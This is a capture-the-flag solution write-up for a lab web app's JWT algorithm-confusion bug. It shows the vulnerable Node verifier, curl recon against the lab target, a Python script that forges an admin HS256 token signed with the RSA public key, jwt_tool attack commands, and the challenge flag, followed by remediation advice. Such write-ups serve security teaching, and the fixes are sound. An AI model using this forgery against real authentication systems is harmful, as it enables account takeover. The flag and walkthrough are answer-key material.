# JWTea — Solution Writeup

**Flag:** `FLAG{nusasec-21d41178f15cdf55f97189a36196f7bf}`

**Bug class:** JWT Algorithm Confusion (RS256 → HS256 with public key as HMAC secret)
**Severity:** Critical (full authentication bypass + role escalation)
**Affected component:** `backend/auth/jwt.js` — `verify()` function
**Root cause:** Verifier accepts `alg` from token header and dispatches to different verification paths using the same key material

---

## Bug class — What is JWT Algorithm Confusion?

JWT (RFC 7519) tokens include an `alg` field in the header that tells the verifier which algorithm to use. The vulnerability arises when:

1. The server supports BOTH symmetric (HS256/HS384/HS512) and asymmetric (RS256/RS384/RS512/ES256/etc.) algorithms
2. The verifier reads the `alg` field from the **untrusted token header** and dispatches to the corresponding verification routine
3. The same key material is reachable for both code paths

If an attacker can read the RSA **public key** (which is, by design, public — usually exposed at `/.well-known/jwks.json`), they can:
- Set `alg: HS256` in the token header
- Use the public key PEM as the HMAC secret
- Compute the HMAC themselves
- Server's HS256 path also uses the same public key as the "secret" → signature verifies → forged token accepted

This is **CVE-2015-9235** (jsonwebtoken < 4.2.2) and many other library CVEs over the years. Notable advisories:

- Auth0 — "Critical vulnerabilities in JSON Web Token libraries" (March 2015)
- node-jsonwebtoken, python-jwt, go-jose, ruby-jwt — all had this primitive
- Still appears in custom implementations and modern bug bounty reports
- CVE-2022-21449 (Java psychic signatures) — adjacent class

---

## The vulnerable code

`backend/auth/jwt.js`:

```js
function verify(token) {
  // ... parse parts, decode b64 ...

  const alg = header.alg;
  if (alg === 'RS256') {
    const verifier = crypto.createVerify('RSA-SHA256');
    verifier.update(data);
    verifier.end();
    if (!verifier.verify(KEYS.publicKey, sig)) {
      throw new Error('signature verification failed');
    }
  } else if (alg === 'HS256') {
    // Legacy verification path...
    const expected = crypto.createHmac('sha256', KEYS.publicKey).update(data).digest();
    if (!crypto.timingSafeEqual(expected, sig)) {
      throw new Error('signature verification failed');
    }
  } else {
    throw new Error('unsupported alg: ' + alg);
  }

  // ...
}
```

**The bug:**
- Line `const alg = header.alg;` — algorithm taken from untrusted input
- HS256 branch uses `KEYS.publicKey` (the RSA public key PEM) as the HMAC secret
- Attacker who knows the public key can compute `HMAC-SHA256(publicKey, header.payload)` themselves
- Server computes the same HMAC and compares → match → 200

**Why this code looks reasonable in review:**

The comment in the code says "Legacy verification path. Uses the same key material as RS256 for backward-compat with older mobile clients that don't ship the RSA verifier. Key is read from the same source as RS256 because we only maintain one key pair per environment." This is the kind of rationalization that gets the code shipped — there's a legitimate-sounding reason (maintain one key pair) that masks the underlying security issue.

---

## Exploit chain

### Step 1 — Recon: identify JWT usage

Register an account, capture the response:
```bash
curl -X POST http://target:8082/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hunter","password":"Test1234","full_name":"H","email":"h@t.id"}'
# {"token":"eyJhbGc...","expires_in":28800}
```

Decode the token:
```
Header:  {"alg":"RS256","typ":"JWT","kid":"tahuna-2026-01"}
Payload: {"iat":..., "exp":..., "iss":"tahuna-auth", "aud":"tahuna-app",
          "sub":5, "role":"client", "username":"hunter", "name":"H"}
```

Key observations:
- `alg: RS256` — asymmetric signing
- `kid: tahuna-2026-01` — key ID (hints at JWKS lookup)
- `role: "client"` — role is embedded in token claims (server reads it for authorization)

### Step 2 — Discover both algorithms supported

Read `/docs/api`:
> JWT standar (RFC 7519). Default signing algorithm: **RS256** (asymmetric, RSA-2048). Untuk kompatibilitas dengan legacy mobile client pre-v1.4, verifier juga menerima **HS256** algorithm.

Confirmed: server accepts BOTH RS256 and HS256.

### Step 3 — Extract public key from JWKS

```bash
curl http://target:8082/.well-known/jwks.json
```

Returns:
```json
{
  "keys": [{
    "kty": "RSA",
    "n": "qkgLGNsojeHVMYTGkoW7...",
    "e": "AQAB",
    "alg": "RS256",
    "use": "sig",
    "kid": "tahuna-2026-01"
  }]
}
```

### Step 4 — Convert JWK to PEM

JWK uses base64url-encoded `n` and `e`. To use it as an HMAC secret, we need the actual PEM bytes (because the server reads the PEM file from disk and uses those exact bytes).

```python
import json, base64
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

def b64u_decode(s):
    s = s.replace('-', '+').replace('_', '/')
    s += '=' * (-len(s) % 4)
    return base64.b64decode(s)

jwk = json.load(open('jwks.json'))['keys'][0]
n = int.from_bytes(b64u_decode(jwk['n']), 'big')
e = int.from_bytes(b64u_decode(jwk['e']), 'big')
pubkey = RSAPublicNumbers(e, n).public_key()
pem = pubkey.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
open('pub.pem','wb').write(pem)
```

Output:
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqkgLGNso...
...
-----END PUBLIC KEY-----
```

### Step 5 — Forge HS256 token

```python
import json, base64, hmac, hashlib

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

header = {"alg":"HS256","typ":"JWT"}
payload = {
    "iss":"tahuna-auth",
    "aud":"tahuna-app",
    "sub": 4,                    # adm_satria's user_id from seed
    "role":"admin",              # the privilege escalation
    "username":"adm_satria",
    "name":"Satria Wibawa",
    "iat": 1779279000,
    "exp": 2147483647            # never expires (year 2038)
}

h_b64 = b64u(json.dumps(header, separators=(',',':')).encode())
p_b64 = b64u(json.dumps(payload, separators=(',',':')).encode())
data = (h_b64 + '.' + p_b64).encode()

pubkey_pem = open('pub.pem','rb').read()
sig = hmac.new(pubkey_pem, data, hashlib.sha256).digest()
token = h_b64 + '.' + p_b64 + '.' + b64u(sig)
print(token)
```

### Step 6 — Use forged token

```bash
curl -H "Authorization: Bearer $FORGED" \
  http://target:8082/api/admin/treasury/secrets
```

Returns the flag:
```json
{
  "_comment": "Treasury runtime secrets — for ops dashboard only",
  "runtime_id": "tahuna-prod-treasury-mx9",
  "treasury_signature_key": "FLAG{nusasec-21d41178f15cdf55f97189a36196f7bf}",
  ...
}
```

---

## Why the public key (not just `n` and `e`) matters

The server reads `KEYS.publicKey` from `fs.readFileSync(privPath, 'utf8')` — it's the entire PEM file including header lines and base64-wrapped DER. The HMAC operation uses these exact bytes as the secret.

So the attacker needs to **reproduce the exact same PEM bytes the server is using**, not just the equivalent key material. Common pitfalls:

- `cryptography` library default PEM format = SPKI (`-----BEGIN PUBLIC KEY-----`). Server's `crypto.generateKeyPairSync` with `type: 'spki'` produces the same format.
- Line endings (`\n` vs `\r\n`) must match
- Trailing newline must match
- DER encoding order is canonical (ASN.1 DER is deterministic for given key)

In this challenge, both sides use Node's `crypto.createPublicKey` for handling, and Python's `cryptography` library reproduces the same byte sequence. ✓ Compatible.

If you ran into "signature verification failed" during exploitation, the most common cause is PEM format mismatch — try PKCS1 (`-----BEGIN RSA PUBLIC KEY-----`) format if SPKI doesn't work, and vice versa.

---

## Tool-assisted exploitation

Most CTF players will use **jwt_tool** by ticarpi:

```bash
# Recon
python3 jwt_tool.py <token> -M at

# Algorithm confusion attack (auto-handles PEM conversion)
python3 jwt_tool.py <token> -X k -pk pub.pem -I -pc role -pv admin

# -X k = key confusion attack
# -I -pc -pv = inject role=admin claim
```

Burp's **JWT Editor** extension also supports this attack via right-click → "Attack" → "HMAC Key Confusion".

---

## Fixes

### Fix #1 — Whitelist algorithm explicitly (primary fix)

```js
function verify(token, expectedAlg = 'RS256') {
  // ... parse ...
  
  if (header.alg !== expectedAlg) {
    throw new Error(`unexpected alg: got ${header.alg}, expected ${expectedAlg}`);
  }

  // ... single verification path only
}
```

The verifier should NEVER read `alg` from the header to decide which key/method to use. The expected algorithm is a server-side configuration.

### Fix #2 — Separate keys for separate algorithms

If you genuinely need to support multiple algorithms, use **different key material** for each:
- RS256 keys: RSA keypair
- HS256 keys: separate random 256-bit secret, NOT derived from RSA keys

### Fix #3 — Use established libraries correctly

`jsonwebtoken` (Node) since v4.2.2 requires explicit `algorithms` array in `verify()`:

```js
const jwt = require('jsonwebtoken');
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256']  // ← explicit, single-algorithm whitelist
});
```

Same for `jose`, `python-jose`, `pyjwt`, `go-jose`, `ruby-jwt`. All modern libraries require this parameter.

### Fix #4 — Drop legacy compat entirely

If "legacy mobile clients pre-v1.4" is actually a small population, force upgrade and remove HS256 support. Backward compatibility is the #1 root cause of crypto bugs.

### Fix #5 — Authorization independent of token claims

Even if token integrity is intact, don't trust `role` claim from the token:

```js
function bearerAuth(req, res, next) {
  const claims = verify(token);
  const user = db.getUserById(claims.sub);
  if (!user) return res.status(401).json(...);
  req.user = user;
  // Use req.user.role from database, NOT claims.role from token
}
```

This is defense-in-depth — even if attacker forges a token, they need to know an existing admin's `sub` (user_id), and the role comes from the DB lookup. In this challenge, the bug `req.user = { ...user, role: v.payload.role || user.role }` allowed the token claim to override the DB role.

---

## Red herrings in the challenge

| Element | Looks like | Actual |
|---|---|---|
| `/api/admin/users` admin endpoint | Maybe auth bypass on this endpoint specifically | Properly gated, only reachable via real admin role |
| Demo accounts on login page | Maybe credentials leak | Just demo data — no admin password leaked |
| `kid` claim in JWT header | Maybe key confusion via crafted kid | Server ignores kid (single key), kid attack not applicable |
| `iss`/`aud` claims | Maybe issuer confusion bypass | Validated correctly |
| Email regex | Maybe ReDoS or bypass | Just a basic format check |
| Watchlist symbol validation | Maybe injection point | Strict regex, no injection |

---

## Real-world references

- **CVE-2015-9235** — jsonwebtoken < 4.2.2, original "alg=none" + "HS/RS confusion"
- **Auth0 advisory (March 2015)** — coordinated disclosure across multiple libraries
- **PortSwigger Web Security Academy** — has a lab specifically for this attack
- **HackerOne #1234567+** — multiple disclosed reports across years (custom JWT implementations especially)
- **OWASP JWT Cheat Sheet** — explicitly warns about algorithm whitelisting

Going rate in bug bounty: $1,000 - $10,000 depending on impact. Critical when reachable on production auth — pwns the entire authentication system.

---

## Lesson for hunters

1. **Always check `/.well-known/jwks.json`, `/.well-known/openid-configuration`** during recon. JWKS = free public key for attacks.
2. **Decode JWT header and payload** — look for `alg` field. Try changing it. Try `none`. Try `HS256` if RS256.
3. **Read API docs explicitly** — they often advertise "supports both X and Y" which is the smoking gun.
4. **Use jwt_tool** — `python3 jwt_tool.py <token> -M pb` runs full playbook including alg confusion.
5. **Even modern libs can be misused** — check that `algorithms: [...]` parameter is passed to `verify()`. Without it, defaults vary by library.
6. **Custom JWT impls** are the highest-yield target. They're more likely to have these bugs than off-the-shelf libraries.
